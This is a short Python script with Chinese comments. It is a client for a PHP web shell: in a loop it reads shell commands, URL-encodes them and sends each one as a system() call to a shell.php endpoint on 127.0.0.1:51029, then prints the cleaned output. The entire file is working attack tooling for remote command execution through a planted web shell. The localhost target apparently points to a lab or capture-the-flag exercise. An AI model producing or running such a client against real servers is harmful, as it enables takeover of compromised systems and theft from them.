import requests
import urllib.parse
import re
from bs4 import BeautifulSoup

def clean_html(html_content):
    """清理HTML，提取纯文本内容"""
    try:
        # 尝试使用BeautifulSoup处理
        soup = BeautifulSoup(html_content, 'html.parser')
        text = soup.get_text(separator='\n')
        return text
    except:
        # 如果BeautifulSoup失败，使用简单的正则表达式
        clean = re.sub(r'<[^>]+>', '', html_content)
        return clean

def interactive_shell():
    print("[+] 交互式Shell - 输入'exit'退出")
    print("------------------------------")
    
    while True:
        try:
            # 获取用户输入命令
            cmd = input("\033[92mshell> \033[0m")
            if cmd.lower() == 'exit':
                break
                
            # URL编码命令
            encoded_cmd = urllib.parse.quote(cmd)
            
            # 发送请求
            url = f'http://127.0.0.1:51029/shell.php?cmd=system(\'{encoded_cmd}\');'
            response = requests.get(url)
            
            # 处理响应
            if response.status_code == 200:
                # 如果响应是HTML，清理它
                if '<html' in response.text.lower():
                    cleaned_output = clean_html(response.text)
                    print(cleaned_output)
                else:
                    print(response.text)
            else:
                print(f"[!] 请求失败，状态码: {response.status_code}")
                
        except KeyboardInterrupt:
            print("\n[!] 用户中断，退出中...")
            break
        except Exception as e:
            print(f"[!] 错误: {str(e)}")

if __name__ == "__main__":
    interactive_shell()